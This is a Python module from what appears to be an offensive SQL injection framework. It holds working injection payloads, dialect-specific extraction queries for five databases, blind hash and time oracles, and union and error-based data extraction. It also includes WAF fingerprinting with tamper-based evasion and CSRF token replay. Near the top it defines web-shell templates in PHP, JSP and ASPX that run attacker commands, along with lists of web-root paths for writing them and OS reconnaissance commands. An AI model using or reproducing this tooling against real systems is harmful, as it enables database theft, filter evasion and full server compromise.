import asyncio
import hashlib
import json as _json
import re
import secrets
import time
import html as _html
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.http import fetch, parse_cookie_string, RateLimiter
from core.output import success, warn, info

from evade.waf_bypass import (
    SQL_TAMPERS,
    fingerprint_waf,
    pick_tampers_for_fingerprint,
    enumerate_tamper_sequences,
)

# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

ERROR_SIGNATURES = {
    "you have an error in your sql syntax": "mysql",
    "warning: mysql": "mysql",
    "mysql_fetch_array()": "mysql",
    "mysqli_sql_exception": "mysql",
    "check the manual that corresponds to your mariadb": "mysql",
    "postgresql query failed": "postgres",
    "pg_query():": "postgres",
    "psycopg2.errors": "postgres",
    "current transaction is aborted": "postgres",
    "unclosed quotation mark after the character string": "mssql",
    "microsoft ole db provider for sql server": "mssql",
    "odbc sql server driver": "mssql",
    "quoted string not properly terminated": "mssql",
    "system.data.sqlclient.sqlexception": "mssql",
    "conversion failed when converting": "mssql",
    "sqlite3.operationalerror": "sqlite",
    "sqlite3.databaseerror": "sqlite",
    "sqlite3.integrityerror": "sqlite",
    "sqlite3.programmingerror": "sqlite",
    "sqlite error": "sqlite",
    "unrecognized token": "sqlite",
    "no such table": "sqlite",
    "no such column": "sqlite",
    "incomplete input": "sqlite",
    "datatype mismatch": "sqlite",
    'near "': "sqlite",
    "operationalerror": "sqlite",
    "databaseerror": "sqlite",
    "ora-01756": "oracle",
    "ora-00933": "oracle",
    "ora-00936": "oracle",
    "ora-": "oracle",
    "oracle error": "oracle",
    "sqlstate[": "generic",
    "sqlalchemy.exc": "generic",
    "sqlalchemy.orm.exc": "generic",
    "psycopg2.programmingerror": "postgres",
    "psycopg2.operationalerror": "postgres",
    "django.db.utils": "generic",
    "django.db.backends": "generic",
    "sequelizedatabaseerror": "generic",
    "sequelize.validationerror": "generic",
    "hibernate.exception": "generic",
    "org.hibernate.exception": "generic",
    "javax.persistence.persistenceexception": "generic",
    "org.springframework.jdbc": "generic",
    "sqlexception:": "generic",
    "activerecord::statementinvalid": "generic",
    "pg::undefinedcolumn": "postgres",
    "pg::syntaxerror": "postgres",
    "pg::programmingerror": "postgres",
    "eloquent\\queryexception": "generic",
    "illuminate\\database": "generic",
    "prismaclientknownrequesterror": "generic",
}


def contains_sql_error(body):
    if not body:
        return None
    lowered = _html.unescape(body).lower()
    for sig in ERROR_SIGNATURES:
        if sig in lowered:
            return sig
    return None


PAYLOADS = ["'", "\"", "')", "';", "' OR '1'='1", "\" OR \"1\"=\"1", "1' AND '1'='2"]

MAX_CONCURRENT_REQUESTS = 10
MAX_EXTRACT_CHARS = 100
ORACLE_REVALIDATE_EVERY = 10
GC_SEP = "\x1f"
TIME_ORACLE_MIN_DELTA = 1.5
TIME_ORACLE_SLEEP = 2
UNION_MAX_COLUMNS = 15
UNION_SENTINEL_A = "zzqA"
UNION_SENTINEL_B = "zzqB"
MAX_EXTRACT_SECONDS = 900
ERROR_WINDOW = 30
PAGE_SIZE = 20
MAX_PAGES = 25

# ── SESSION 1 ── File-write / web-shell constants ────────────────────

SHELL_TEMPLATES = {
    "php": (
        "<?php if(isset($_GET['c'])){"
        "system($_GET['c']);"
        "}?>"
    ),
    "jsp": (
        "<%@ page import=\"java.util.*,java.io.*\"%>"
        "<% if(request.getParameter(\"c\")!=null){"
        "Process p=Runtime.getRuntime().exec("
        "new String[]{\"/bin/sh\",\"-c\","
        "request.getParameter(\"c\")});"
        "BufferedReader br=new BufferedReader("
        "new InputStreamReader(p.getInputStream()));"
        "String l;while((l=br.readLine())!=null){out.println(l);}}%>"
    ),
    "aspx": (
        "<%@ Page Language=\"C#\" %>"
        "<% if(Request[\"c\"]!=null){"
        "System.Diagnostics.Process p=new System.Diagnostics.Process();"
        "p.StartInfo.FileName=\"cmd.exe\";"
        "p.StartInfo.Arguments=\"/c \"+Request[\"c\"];"
        "p.StartInfo.UseShellExecute=false;"
        "p.StartInfo.RedirectStandardOutput=true;"
        "p.Start();"
        "Response.Write(p.StandardOutput.ReadToEnd());}%>"
    ),
}

WEB_ROOT_CANDIDATES = {
    "linux": [
        "/var/www/html/",
        "/var/www/",
        "/var/www/htdocs/",
        "/usr/share/nginx/html/",
        "/usr/local/apache2/htdocs/",
        "/srv/http/",
        "/opt/lampp/htdocs/",
    ],
    "windows": [
        "C:/inetpub/wwwroot/",
        "C:/xampp/htdocs/",
        "C:/wamp/www/",
        "C:/wamp64/www/",
        "C:/Apache24/htdocs/",
    ],
}

SHELL_EXTENSIONS = ["php", "phtml", "php5", "php7", "jsp", "aspx"]

SHELL_VERIFY_MARKER = "tk-shell-" + secrets.token_hex(4)

# ── END SESSION 1 constants ──────────────────────────────────────────

# ── SESSION 2 ── OS command execution constants ──────────────────────

RCE_RECON_CMD_LINUX = "id; hostname; uname -a; whoami"
RCE_RECON_CMD_WINDOWS = "whoami & hostname & ver"

RCE_TABLE_PREFIX = "tk_rce_"

RCE_MAX_OUTPUT = 8192

RCE_SENTINEL_A = "zzrceA"
RCE_SENTINEL_B = "zzrceB"

# ── END SESSION 2 constants ──────────────────────────────────────────

# ── SESSION 3a (shelved) ── SQLite constants ─────────────────────────

SQLITE_SHELL_TEMPLATE = (
    "import subprocess, sys\n"
    "cmd = sys.argv[1] if len(sys.argv) > 1 else 'id'\n"
    "print(subprocess.run(cmd, shell=True, capture_output=True, "
    "text=True).stdout, end='')\n"
)

SQLITE_SHELL_PREFIX = "tk_"

SQLITE_SHELL_PATH = None

# ── END SESSION 3a constants ─────────────────────────────────────────

# ── SESSION 3b ── UDF/CLR/plugin constants ───────────────────────────

UDF_CHUNK_SIZE = 512 * 1024

# ── END SESSION 3b constants ─────────────────────────────────────────

# --- WAF detection ---
WAF_SIGNATURES = [
    "mod_security", "modsecurity", "owasp_crs", "owasp crs",
    "not acceptable", "the requested url was rejected",
    "your support id is",
    "cloudflare", "incapsula", "sucuri cloudproxy", "akamai",
    "imperva", "incapsula incident id", "f5 networks",
    "barracuda", "fortiweb", "wallarm", "stackpath",
    "aws waf", "awselb",
    "wordfence", "all in one wp security",
    "request blocked", "malicious request", "attack detected",
    "suspicious activity", "blocked by",
]

# --- CSRF ---
CSRF_PATTERNS = [
    "csrf",
    "_token",
    "authenticity_token",
    "__requestverificationtoken",
    "xsrf",
    "anticsrf",
    "csrfmiddlewaretoken",
    "verification_token",
]

_HIDDEN_INPUT_RE = re.compile(
    r"""<input[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*\bvalue\s*=\s*["']([^"']*)["']""",
    re.IGNORECASE | re.DOTALL,
)
_HIDDEN_INPUT_RE_REV = re.compile(
    r"""<input[^>]*\bvalue\s*=\s*["']([^"']*)["'][^>]*\bname\s*=\s*["']([^"']+)["']""",
    re.IGNORECASE | re.DOTALL,
)
_META_RE = re.compile(
    r"""<meta[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*\bcontent\s*=\s*["']([^"']*)["']""",
    re.IGNORECASE | re.DOTALL,
)


# ---------------------------------------------------------------------
# WAF evasion — delegate to evade.waf_bypass
# ---------------------------------------------------------------------

_DIALECT_TAMPERS = {
    "mysql":    {"mysql"},
    "mssql":    {"mssql"},
    "postgres": {"postgres"},
    "oracle":   {"oracle"},
    "sqlite":   {"sqlite"},
}


def _filter_for_dialect(tamper_names, dbms):
    """Remove tampers that don't apply to the given dialect."""
    dbms = dbms or DEFAULT_DIALECT
    allowed_specific = _DIALECT_TAMPERS.get(dbms, set())
    out = []
    for name in tamper_names:
        entry = SQL_TAMPERS.get(name)
        if entry is None:
            out.append(name)
            continue
        cat = entry[0]
        if cat in ("mysql", "mssql", "postgres", "oracle", "sqlite"):
            if cat not in allowed_specific:
                continue
        out.append(name)
    return out


def _mutators_for(dbms):
    """Return an ordered list of (name, fn) pairs for the given dialect.

    Kept as a shim for callers that expect the old interface.
    """
    out = [("identity", lambda p: p)]
    for name, (cat, fn) in sorted(SQL_TAMPERS.items()):
        if cat in ("mysql", "mssql", "postgres", "oracle", "sqlite"):
            if cat != (dbms or DEFAULT_DIALECT):
                continue
        out.append((name, fn))
    return out


_LAST_WAF_FINGERPRINT = None


# ---------------------------------------------------------------------
# Dialects
# ---------------------------------------------------------------------

DIALECTS = {
    "mysql": {
        "version": "version()",
        "concat": lambda parts: f"concat({', '.join(parts)})",
        "substring": lambda expr, pos: f"substring(({expr}),{pos},1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"group_concat({expr} SEPARATOR 0x1f)",
        "union_aggregate": lambda e: f"group_concat({e} SEPARATOR 0x1f)",
        "tables_query": ("SELECT group_concat(table_name SEPARATOR 0x1f) "
                         "FROM information_schema.tables WHERE table_schema=database()"),
        "tables_page_query": (
            "SELECT group_concat(table_name SEPARATOR 0x1f) FROM ("
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database() "
            "LIMIT {limit} OFFSET {offset}) t"),
        "columns_query": lambda t: (
            "SELECT group_concat(column_name SEPARATOR 0x1f) "
            "FROM information_schema.columns "
            f"WHERE table_schema=database() AND table_name='{t}'"),
        "sleep": lambda n: f"sleep({n})",
        "comment": "-- ",
        "ident_quote": "`",
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "postgres": {
        "version": "version()",
        "concat": lambda parts: " || ".join(parts),
        "substring": lambda expr, pos: f"substring(({expr}) from {pos} for 1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"string_agg({expr}, chr(31))",
        "union_aggregate": lambda e: f"string_agg({e}, chr(31))",
        "tables_query": ("SELECT string_agg(table_name, chr(31)) "
                         "FROM information_schema.tables "
                         "WHERE table_schema=current_schema()"),
        "tables_page_query": (
            "SELECT string_agg(table_name, chr(31)) FROM ("
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=current_schema() "
            "LIMIT {limit} OFFSET {offset}) t"),
        "columns_query": lambda t: (
            "SELECT string_agg(column_name, chr(31)) "
            "FROM information_schema.columns "
            f"WHERE table_schema=current_schema() AND table_name='{t}'"),
        "sleep": lambda n: f"pg_sleep({n})",
        "comment": "-- ",
        "ident_quote": '"',
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "mssql": {
        "version": "@@VERSION",
        "concat": lambda parts: " + ".join(parts),
        "substring": lambda expr, pos: f"substring(({expr}),{pos},1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"string_agg({expr}, char(31))",
        "union_aggregate": lambda e: f"string_agg({e}, char(31))",
        "tables_query": "SELECT string_agg(table_name, char(31)) FROM information_schema.tables",
        "tables_page_query": (
            "SELECT string_agg(table_name, char(31)) FROM ("
            "SELECT table_name FROM information_schema.tables "
            "ORDER BY table_name "
            "OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY) t"),
        "columns_query": lambda t: (
            "SELECT string_agg(column_name, char(31)) "
            f"FROM information_schema.columns WHERE table_name='{t}'"),
        "sleep": lambda n: f"WAITFOR DELAY '0:0:{n}'",
        "comment": "-- ",
        "ident_quote": "[",
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "sqlite": {
        "version": "sqlite_version()",
        "concat": lambda parts: " || ".join(parts),
        "substring": lambda expr, pos: f"substr(({expr}),{pos},1)",
        "ascii": lambda expr: f"unicode({expr})",
        "group_concat": lambda expr: f"group_concat({expr}, char(31))",
        "union_aggregate": lambda e: f"group_concat({e}, char(31))",
        "tables_query": "SELECT group_concat(name, char(31)) FROM sqlite_master WHERE type='table'",
        "tables_page_query": (
            "SELECT group_concat(name, char(31)) FROM ("
            "SELECT name FROM sqlite_master WHERE type='table' "
            "LIMIT {limit} OFFSET {offset}) t"),
        "columns_query": lambda t: (
            f"SELECT group_concat(name, char(31)) FROM pragma_table_info('{t}')"),
        "sleep": lambda n: (
            f"(SELECT count(*) FROM (WITH RECURSIVE c(x) AS "
            f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{n*2000000}) "
            f"SELECT x FROM c))"
        ),
        "comment": "-- ",
        "ident_quote": '"',
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "oracle": {
        "version": "(SELECT banner FROM v$version WHERE rownum=1)",
        "concat": lambda parts: " || ".join(parts),
        "substring": lambda expr, pos: f"substr(({expr}),{pos},1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"listagg({expr}, chr(31))",
        "union_aggregate": lambda e: (
            f"RTRIM(XMLAGG(XMLELEMENT(e,({e}),chr(31)).EXTRACT('//text()')),"
            f"chr(31))"
        ),
        "tables_query": "SELECT listagg(table_name, chr(31)) FROM all_tables",
        "tables_page_query": (
            "SELECT listagg(table_name, chr(31)) FROM ("
            "SELECT table_name FROM all_tables "
            "ORDER BY table_name "
            "OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY) t"),
        "columns_query": lambda t: (
            "SELECT listagg(column_name, chr(31)) FROM all_tab_columns "
            f"WHERE table_name='{t.upper()}'"),
        "sleep": lambda n: f"dbms_pipe.receive_message(('a'),{n})",
        "comment": "-- ",
        "ident_quote": '"',
        "str_escape": lambda s: s.replace("'", "''"),
    },
}

DEFAULT_DIALECT = "mysql"


def _dialect(dbms):
    return DIALECTS.get(dbms or DEFAULT_DIALECT, DIALECTS[DEFAULT_DIALECT])


def _ident(name, d):
    q = d["ident_quote"]
    return f"[{name}]" if q == "[" else f"{q}{name}{q}"


# ---------------------------------------------------------------------
# Injection contexts
# ---------------------------------------------------------------------

def _ctx_single_quote(cond): return f"' AND ({cond})--"
def _ctx_double_quote(cond): return f"\" AND ({cond})--"
def _ctx_numeric(cond):      return f" AND ({cond})--"
def _ctx_paren_single(cond): return f"') AND ({cond})--"
def _ctx_paren_double(cond): return f"\") AND ({cond})--"

CONTEXTS = [
    ("single_quote", _ctx_single_quote),
    ("double_quote", _ctx_double_quote),
    ("numeric",      _ctx_numeric),
    ("paren_single", _ctx_paren_single),
    ("paren_double", _ctx_paren_double),
]

UNION_PREFIXES = {
    "single_quote":  "' UNION SELECT ",
    "double_quote":  "\" UNION SELECT ",
    "numeric":       " UNION SELECT ",
    "paren_single":  "') UNION SELECT ",
    "paren_double":  "\") UNION SELECT ",
}


# ---------------------------------------------------------------------
# CSRF token jar
# ---------------------------------------------------------------------

class TokenJar:
    def __init__(self):
        self.tokens = {}

    def update(self, found):
        if found:
            self.tokens.update({k.lower(): v for k, v in found.items()})

    def get(self, name):
        return self.tokens.get((name or "").lower())

    def __bool__(self):
        return bool(self.tokens)


def _looks_like_csrf(name):
    low = (name or "").lower()
    return any(p in low for p in CSRF_PATTERNS)


def find_tokens(body, headers=None):
    found = {}
    if body:
        for m in _HIDDEN_INPUT_RE.finditer(body):
            name, value = m.group(1), m.group(2)
            if _looks_like_csrf(name):
                found[name] = value
        for m in _HIDDEN_INPUT_RE_REV.finditer(body):
            value, name = m.group(1), m.group(2)
            if _looks_like_csrf(name):
                found[name] = value
        for m in _META_RE.finditer(body):
            name, value = m.group(1), m.group(2)
            if _looks_like_csrf(name):
                found[name] = value
    if headers:
        for hname, hval in headers.items():
            if _looks_like_csrf(hname):
                found[hname] = hval
    return found


async def refresh_tokens(session, point, jar, limiter, verbose=False):
    token_point = InjectionPoint(
        point.kind, point.name, point.url, point.method,
        dict(point.headers), point.body, point.content_type,
        dict(point.cookies) if point.cookies else None,
    )
    r = await _send_raw(session, token_point, limiter)
    if r is None:
        return False
    _, headers, body, _ = r
    found = find_tokens(body, headers)
    if found:
        jar.update(found)
        if verbose:
            info(f"csrf: cached {len(found)} token(s): "
                 f"{', '.join(found.keys())}")
        return True
    return False


def _apply_tokens(point, jar):
    if not jar:
        return point
    clone = InjectionPoint(
        point.kind, point.name, point.url, point.method,
        dict(point.headers), point.body, point.content_type,
        dict(point.cookies) if point.cookies else None,
    )
    if clone.body:
        ct = (clone.content_type or "").lower()
        if "json" in ct:
            try:
                obj = _json.loads(clone.body)
                if isinstance(obj, dict):
                    changed = False
                    for k in list(obj.keys()):
                        tok = jar.get(k)
                        if tok is not None:
                            obj[k] = tok
                            changed = True
                    if changed:
                        clone.body = _json.dumps(obj)
            except Exception:
                pass
        else:
            qp = parse_qs(clone.body, keep_blank_values=True)
            changed = False
            for k in list(qp.keys()):
                tok = jar.get(k)
                if tok is not None:
                    qp[k] = [tok]
                    changed = True
            if changed:
                clone.body = urlencode(qp, doseq=True)
    for hname in list(clone.headers.keys()):
        tok = jar.get(hname)
        if tok is not None:
            clone.headers[hname] = tok
    for name, value in jar.tokens.items():
        if any(name == h.lower() for h in clone.headers):
            continue
        if "-" in name:
            clone.headers[name] = value
    return clone


# ---------------------------------------------------------------------
# Injection points
# ---------------------------------------------------------------------

class InjectionPoint:
    def __init__(self, kind, name, url, method="GET", headers=None,
                 body=None, content_type=None, cookies=None, dbms=None):
        self.kind = kind
        self.name = name
        self.url = url
        self.method = method.upper()
        self.headers = dict(headers or {})
        self.body = body
        self.content_type = content_type
        self.cookies = cookies
        self.dbms = dbms

    def with_payload(self, payload):
        c = InjectionPoint(self.kind, self.name, self.url, self.method,
                           self.headers, self.body, self.content_type,
                           self.cookies, self.dbms)
        if self.kind == "query":
            c.url = _inject_into_query(self.url, self.name, payload)
        elif self.kind == "body":
            c.body = _inject_into_body(self.body or "", self.name, payload,
                                       self.content_type)
        elif self.kind == "header":
            existing = c.headers.get(self.name, "")
            c.headers[self.name] = f"{existing}{payload}"
        elif self.kind == "cookie":
            c.cookies = dict(self.cookies or {})
            existing = c.cookies.get(self.name, "")
            c.cookies[self.name] = f"{existing}{payload}"
        return c


def _inject_into_query(url, name, payload):
    p = urlparse(url)
    qp = parse_qs(p.query, keep_blank_values=True)
    if name in qp and len(qp[name]) > 1:
        warn(f"param {name!r} has {len(qp[name])} values; using first")
    qp[name] = [str(qp[name][0]) + payload] if name in qp else [payload]
    return urlunparse((p.scheme, p.netloc, p.path, p.params,
                       urlencode(qp, doseq=True), p.fragment))


def _inject_into_body(body, name, payload, content_type):
    ct = (content_type or "").lower()
    if "json" in ct:
        try:
            obj = _json.loads(body) if body else {}
        except Exception:
            obj = {}
        if isinstance(obj, dict) and name in obj:
            obj[name] = f"{obj[name]}{payload}"
        elif isinstance(obj, dict):
            obj[name] = payload
        return _json.dumps(obj)
    qp = parse_qs(body, keep_blank_values=True)
    qp[name] = [str(qp[name][0]) + payload] if name in qp else [payload]
    return urlencode(qp, doseq=True)


# ---------------------------------------------------------------------
# Adaptive limiter
# ---------------------------------------------------------------------

class AdaptiveLimiter:
    def __init__(self, base: RateLimiter):
        self.base = base
        self.backoff = 1.0
        self.clean_streak = 0

    async def wait(self):
        if self.backoff > 1.0:
            await asyncio.sleep(self.backoff - 1.0)
        await self.base.wait()

    def observe(self, status):
        if status in (429, 503):
            self.backoff = min(self.backoff * 2.0, 64.0)
            self.clean_streak = 0
        elif status is not None and status < 500:
            self.clean_streak += 1
            if self.clean_streak >= 20:
                self.backoff = 1.0
                self.clean_streak = 0


# ---------------------------------------------------------------------
# HTTP
# ---------------------------------------------------------------------

async def _send_raw(session, point, limiter):
    start = time.perf_counter()
    hdrs = dict(point.headers)
    if point.content_type:
        hdrs["Content-Type"] = point.content_type
    if point.cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in point.cookies.items())
        hdrs["Cookie"] = cookie_str
    try:
        status, headers, body, _ = await fetch(
            session, point.url, limiter.base,
            method=point.method,
            cookies=None,
            headers=hdrs,
            data=(point.body.encode("utf-8")
                  if (point.method != "GET" and point.body)
                  else None),
        )
    except Exception as e:
        warn(f"transport error on {point.url}: {type(e).__name__}: {e!r}")
        return None
    elapsed = time.perf_counter() - start
    if body is None:
        return None
    limiter.observe(status)
    return status, headers, body, elapsed


def _looks_blocked(status, body, baseline_len=None):
    if status in (403, 406, 419, 429, 501, 502, 503):
        return True
    if body is None:
        return True
    low = body.lower()
    for sig in WAF_SIGNATURES:
        if sig in low:
            return True
    if baseline_len and baseline_len >= 500:
        if len(body) < 100:
            return True
        if len(body) > 4 * baseline_len:
            return True
    return False


async def _send(session, point, limiter, jar=None, raw_payload=None,
                evade=False, baseline_len=None, verbose=False, dbms=None):
    if raw_payload is None:
        if jar:
            point = _apply_tokens(point, jar)
        r = await _send_raw(session, point, limiter)
        if r is None:
            return None
        return r + ("identity",)

    if not evade:
        p = point.with_payload(raw_payload)
        if jar:
            p = _apply_tokens(p, jar)
        r = await _send_raw(session, p, limiter)
        if r is None:
            return None
        return r + ("identity",)

    effective_dbms = dbms or point.dbms
    fingerprint = _LAST_WAF_FINGERPRINT

    if fingerprint is None or fingerprint.get("detected") == "none":
        p = point.with_payload(raw_payload)
        if jar:
            p = _apply_tokens(p, jar)
        r = await _send_raw(session, p, limiter)
        if r is None:
            return None
        return r + ("identity",)

    tamper_names = pick_tampers_for_fingerprint(fingerprint, "sql")
    tamper_names = _filter_for_dialect(tamper_names, effective_dbms)

    for chain, mutated in enumerate_tamper_sequences(
            raw_payload, tamper_names, depth=1, max_sequences=60,
            protocol="sql"):
        p = point.with_payload(mutated)
        if jar:
            p = _apply_tokens(p, jar)
        r = await _send_raw(session, p, limiter)
        if r is None:
            continue
        status, headers, body, elapsed = r
        if not _looks_blocked(status, body, baseline_len):
            chain_name = ",".join(chain)
            if chain_name != "identity" and verbose:
                info(f"waf bypass: {chain_name!r} worked for {point.name!r}")
            return r + (chain_name,)
        if verbose:
            info(f"waf: tamper {','.join(chain)!r} blocked")
    warn(f"waf: all tampers blocked for {point.name!r}")
    return None


def _hash(body):
    return hashlib.sha1(body.encode("utf-8", errors="ignore")).hexdigest()


# ---------------------------------------------------------------------
# Context detection
# ---------------------------------------------------------------------

async def detect_context(session, point, limiter, dbms, jar=None, verbose=False,
                         evade=False, baseline_len=None):
    d = _dialect(dbms)
    for name, wrap in CONTEXTS:
        t = await _send(session, point, limiter, jar,
                        raw_payload=wrap("1=1"), evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        f = await _send(session, point, limiter, jar,
                        raw_payload=wrap("1=2"), evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if t is None or f is None:
            continue

        if verbose:
            m = re.search(r"<pre>(.*?)</pre>", t[2], re.DOTALL)
            err = m.group(1) if m else "(no <pre>)"
            info(f"DEBUG pre-block for {name!r}: {err[:200]!r}")

        if contains_sql_error(t[2]) or contains_sql_error(f[2]):
            if verbose:
                info(f"context {name!r}: payload triggers SQL error, "
                     f"not a usable data oracle")
            continue

        t2 = await _send(session, point, limiter, jar,
                         raw_payload=wrap("1=1"), evade=evade,
                         baseline_len=baseline_len, verbose=verbose,
                         dbms=dbms)
        if t2 is not None and _hash(t[2]) != _hash(t2[2]):
            if verbose:
                warn(f"context {name!r}: page is dynamic, oracle unstable")
            continue

        if _hash(t[2]) != _hash(f[2]):
            if verbose:
                info(f"context {name!r} usable via hash oracle")
            return name, wrap, "hash", {"true_hash": _hash(t[2])}

        if d["sleep"] is None:
            continue
        base = await _send(session, point, limiter, jar,
                           raw_payload=None, evade=False,
                           baseline_len=baseline_len, verbose=verbose)
        if base is None:
            continue
        sleep_expr = d["sleep"](TIME_ORACLE_SLEEP)
        t_time = await _send(session, point, limiter, jar,
                             raw_payload=wrap(f"({sleep_expr})"), evade=evade,
                             baseline_len=baseline_len, verbose=verbose,
                             dbms=dbms)
        if t_time is None:
            continue
        if (t_time[3] - base[3]) >= TIME_ORACLE_MIN_DELTA:
            if verbose:
                info(f"context {name!r} usable via time oracle")
            return name, wrap, "time", {"baseline": base[3]}

    if verbose:
        warn(f"no usable injection context for {point.kind}:{point.name!r} "
             f"(oracle opaque: page may ignore the parameter, or a WAF is "
             f"stripping payloads, or the dialect has no sleep fallback)")
    return None, None, None, None


# ---------------------------------------------------------------------
# Blind DBMS fingerprint
# ---------------------------------------------------------------------

async def fingerprint_blind_dbms(session, point, wrap, limiter, oracle_kind,
                                 oracle_state, jar=None, verbose=False,
                                 baseline_len=None):
    for dbms in ("sqlite", "mysql", "postgres", "mssql", "oracle"):
        d = _dialect(dbms)
        expr = d["ascii"](d["substring"](d["version"], 1))
        cond = f"{expr} IS NOT NULL AND {expr} > 0"
        if oracle_kind == "hash":
            r = await check_hash_condition(
                session, point, wrap, cond, limiter,
                oracle_state["true_hash"], jar, False, baseline_len,
                verbose, dbms)
        else:
            r = await check_time_condition(
                session, point, wrap, cond, limiter, dbms,
                oracle_state["baseline"], jar, False, baseline_len, verbose)
        if r:
            if verbose:
                info(f"fingerprint: {dbms} (version function returned data)")
            return dbms
    return None


# ---------------------------------------------------------------------
# Reflection suppression
# ---------------------------------------------------------------------

async def detect_reflection(session, point, limiter, jar=None, verbose=False,
                            evade=False, baseline_len=None, baseline_hash=None):
    a = await _send(session, point, limiter, jar,
                    raw_payload="zzA" + secrets.token_hex(6), evade=evade,
                    baseline_len=baseline_len, verbose=verbose)
    b = await _send(session, point, limiter, jar,
                    raw_payload="zzB" + secrets.token_hex(6), evade=evade,
                    baseline_len=baseline_len, verbose=verbose)
    if a is None or b is None:
        return False

    if contains_sql_error(a[2]) and contains_sql_error(b[2]):
        return False

    ha, hb = _hash(a[2]), _hash(b[2])
    reflected = ha != hb
    if reflected and baseline_hash is not None:
        if ha == baseline_hash or hb == baseline_hash:
            reflected = False
    if reflected and verbose:
        warn(f"parameter {point.name!r} reflects payloads; extraction may be poisoned")
    return reflected


# ---------------------------------------------------------------------
# Union
# ---------------------------------------------------------------------

async def detect_union(session, point, ctx_name, limiter, dbms,
                       baseline_body, jar=None, max_columns=UNION_MAX_COLUMNS,
                       verbose=False, evade=False, baseline_len=None):
    d = _dialect(dbms)
    prefix = UNION_PREFIXES.get(ctx_name)
    if prefix is None:
        return None, None
    comment = d["comment"]

    for n in range(1, max_columns + 1):
        for idx in range(n):
            marker = f"{UNION_SENTINEL_A}{n}x{idx}{UNION_SENTINEL_B}"
            if marker in baseline_body:
                continue
            cols = [str(i + 1) for i in range(n)]
            cols[idx] = f"'{marker}'"
            payload = f"{prefix}{','.join(cols)}{comment}"
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                continue
            if marker in r[2] and marker not in baseline_body:
                if verbose:
                    info(f"union: {n} columns, position {idx} printable")
                return n, idx
    return None, None


async def union_extract(session, point, ctx_name, limiter, n_cols,
                        printable_idx, sql_query, dbms, jar=None,
                        label="data", verbose=False, evade=False,
                        baseline_len=None):
    d = _dialect(dbms)
    prefix = UNION_PREFIXES.get(ctx_name)
    if prefix is None:
        return ""
    comment = d["comment"]

    agg = d.get("union_aggregate") or d["group_concat"]
    inner = agg(f"({sql_query})")
    marker_a = f"zzqA{secrets.token_hex(4)}"
    marker_b = f"zzqB{secrets.token_hex(4)}"
    bracketed = d["concat"]([f"'{marker_a}'", inner, f"'{marker_b}'"])

    cols = [str(i + 1) for i in range(n_cols)]
    cols[printable_idx] = bracketed
    payload = f"{prefix}{','.join(cols)}{comment}"
    r = await _send(session, point, limiter, jar,
                    raw_payload=payload, evade=evade,
                    baseline_len=baseline_len, verbose=verbose,
                    dbms=dbms)
    if r is None:
        return ""
    body = r[2]

    if body.count(marker_a) != 1 or body.count(marker_b) != 1:
        if verbose:
            warn(f"{label}: sentinel ambiguity "
                 f"(a={body.count(marker_a)} b={body.count(marker_b)})")
        return ""

    start = body.find(marker_a) + len(marker_a)
    end = body.find(marker_b, start)
    if end < 0:
        return ""
    value = body[start:end]
    if verbose and value:
        info(f"  {label} (union): {value[:60]!r}")
    return value


# ---------------------------------------------------------------------
# Error-based extraction — MySQL, MSSQL, Oracle
# ---------------------------------------------------------------------

MYSQL_ERROR_FUNCS = {
    "extractvalue": {
        "payload": "AND extractvalue(1,concat(0x7e,({expr})))",
        "windowed": True,
        "marker": "~",
    },
    "updatexml": {
        "payload": "AND updatexml(1,concat(0x7e,({expr})),1)",
        "windowed": True,
        "marker": "~",
    },
    "gtid_subset": {
        "payload": "AND GTID_SUBSET(({expr}),1)",
        "windowed": False,
        "marker": "'",
    },
}

MSSQL_ERROR_FUNCS = {
    "convert_int": {
        "payload_template": "AND 1=convert(int, ({wrapped_expr}))",
        "windowed": True,
        "truncate_len": 180,
    },
    "cast_int": {
        "payload_template": "AND 1=cast(({wrapped_expr}) AS int)",
        "windowed": True,
        "truncate_len": 180,
    },
}

ORACLE_ERROR_FUNCS = {
    "utl_inaddr": {
        "payload_template": "AND 1=utl_inaddr.get_host_address({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
    "ctxsys_drithsx": {
        "payload_template": "AND 1=ctxsys.drithsx.sn({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
    "dbms_xmlgen": {
        "payload_template": "AND 1=dbms_xmlgen.newcontext({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
    "xmltype": {
        "payload_template": "AND 1=xmltype({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
}


def _wrap_sentinel_oracle(expr, a, b):
    return f"'{a}'||({expr})||'{b}'"


def _wrap_sentinel_mssql(expr, a, b):
    return f"'{a}' + ({expr}) + '{b}'"


def _parse_between_sentinels(body, a, b):
    if not body or a not in body or b not in body:
        return ""
    start = body.find(a)
    if start < 0:
        return ""
    start += len(a)
    end = body.find(b, start)
    if end < 0:
        return ""
    return body[start:end]


def _parse_error_value_mysql(body, marker):
    if not body or marker not in body:
        return ""
    idx = body.find(marker)
    while idx >= 0:
        start = idx + len(marker)
        end_sq = body.find("'", start)
        end_dq = body.find('"', start)
        candidates = [e for e in (end_sq, end_dq) if e >= 0]
        if candidates:
            end = min(candidates)
            value = body[start:end]
            if value and "\n" not in value:
                return value
        idx = body.find(marker, idx + 1)
    return ""


